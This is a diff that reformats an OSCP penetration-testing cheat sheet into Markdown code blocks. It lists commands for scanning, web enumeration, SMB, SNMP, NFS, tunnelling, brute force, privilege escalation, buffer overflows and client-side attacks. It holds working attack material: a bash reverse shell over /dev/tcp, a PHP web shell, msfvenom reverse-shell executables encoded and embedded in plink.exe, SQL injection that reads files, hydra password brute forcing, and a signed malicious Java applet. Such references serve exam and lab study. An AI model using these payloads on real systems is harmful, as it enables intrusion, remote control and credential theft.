@@ -1,27 +1,26 @@
-OSCP Reference
+# [OSCP Reference]
 
-Port Scanning
-SYN Scan with default Script Scan, Skip host discovery with the fastest timing:
-nmap -sC -sS -Pn -T5 -p T:1-65535,U:1-65535 192.168.0.17 > scan 
+## Port Scanning
 
-Fastest Scan for ever: 
-nmap -sS -Pn -T5 192.168.0.17 > scan
-
-Ping Scan: 
-nmap -v -sn 10.0.0.0/8
-
+```bash
 nmap -sC -sV -p- -oA nmap/all 10.10.10.10 
 nmap -sU -vv -oA nmap/alludp 10.10.10.10
 unicornscan 10.1.1.0/24:80
 masscan -p22,80,445 10.1.1.0/24
+```
 
-Port Knocking
+## Port Knocking
+
+```bash
 for x in 7000 8000 9000; do nmap -Pn --max-retries 0 -p $x 10.10.10.10; done
+```
 
-Web
+## Web
+
+```bash
 # Gobuster 3
-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10 -x html,php,txt,xml -t 20
-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.10 -x html,php,txt,xml -k
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10 -x html,php -t 20
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.10 -x html,php -k
 
 curl -v http://10.10.10.10/robots.txt
 curl -k -v https://10.10.10.10/robots.txt
@@ -44,7 +43,6 @@ nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 10.1
 
 # WordPress
 wpscan --url http://10.10.10.10 --enumerate u
-wpscan --url http://10.1.1.146 --http-auth admin:Str0ngPass -e
 
 # Drupal
 # https://github.com/droope/droopescan
@@ -82,8 +80,11 @@ union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
 
 # Alternative
 <?php echo shell_exec($_GET["cmd"]);?>
+```
 
-SMB
+## SMB
+
+```bash
 nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10
 
 nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10
@@ -119,23 +120,32 @@ echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
 echo "" && sleep .1
 
 nmap --script=samba-vuln-cve-2012-1182  -p 139 10.10.10.10
+```
 
-SNMP
+## SNMP
+
+```bash
 snmp-check 10.10.10.10
 
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings_onesixtyone.txt 10.10.10.10 public
 
 snmpwalk -v1 -c public 10.10.10.10
+```
 
-NFS
+## NFS
+
+```bash
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.10
 
 mount -t nfs 10.10.10.10:/var/nfs /mnt/nfs
 
 # Resources 
 # https://github.com/bonsaiviking/NfSpy
+```
 
-SSH Tunneling
+## SSH Tunneling
+
+```bash
 # https://github.com/sshuttle/sshuttle
 sshuttle -vvr user@10.10.10.10 10.1.1.0/24
 
@@ -150,8 +160,11 @@ ssh -D <local proxy port> -p <remote port> <target>
 
 # Plink local port forwarding
 plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
+```
 
-Brute Force
+## Brute Force
+
+```bash
 # /etc/shadow
 unshadow passwd shadow > unshadow.db
 john unshadow.db --wordlist=/usr/share/wordlists/rockyou.txt
@@ -185,8 +198,11 @@ hydra -l username -P /usr/share/wordlists/fasttrack.txt ssh://10.10.10.10
 hydra -l username -P /usr/share/wordlists/fasttrack.txt ftp://10.10.10.10
 # RDP
 hydra -l username -P /usr/share/wordlists/fasttrack.txt rdp://10.10.10.10
+```
 
-Payload/Shell
+## Payload/Shell
+
+```bash
 # Bash
 bash -i >& /dev/tcp/10.10.10.10/8080 0>&1
 
@@ -255,8 +271,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o
 
 # Windows reverse shell embedded into plink  
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+```
 
-Windows Privilege Escalation
+## Windows Privilege Escalation
+
+```powershell
 # What system are we connected to?
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
@@ -391,8 +410,11 @@ Response.write(o)
 # https://github.com/PowerShellMafia/PowerSploit
 # https://github.com/rasta-mouse/Sherlock
 # https://github.com/ohpe/juicy-potato
+```
 
-Linux Privilege Escalation
+## Linux Privilege Escalation
+
+```bash
 # Enter while in reverse shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 
@@ -430,8 +452,11 @@ id
 # https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/
 # https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
 # https://gtfobins.github.io/
+```
 
-Buffer Overflow
+## Buffer Overflow
+
+```bash
 # Payload
 payload = "\x41" * <length> + <ret_address> + "\x90" * 16 + <shellcode> + "\x43" * <remaining_length>
 
@@ -463,8 +488,11 @@ badchars = (
 "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
 "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
+```
 
-Client Side Attack
+## Client Side Attack
+
+```bash
 /usr/lib/jvm/java-8-openjdk-i386/bin/javac -source 1.7 -target 1.7 Java.java
 
 echo "Permissions: all-permissions" > /root/manifest.txt
@@ -476,10 +504,4 @@ echo "Permissions: all-permissions" > /root/manifest.txt
 /usr/lib/jvm/java-8-openjdk-i386/bin/jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
 
 cp Java.class SignedJava.jar /var/www/html/
-
-
-
-
-
-
-
+```
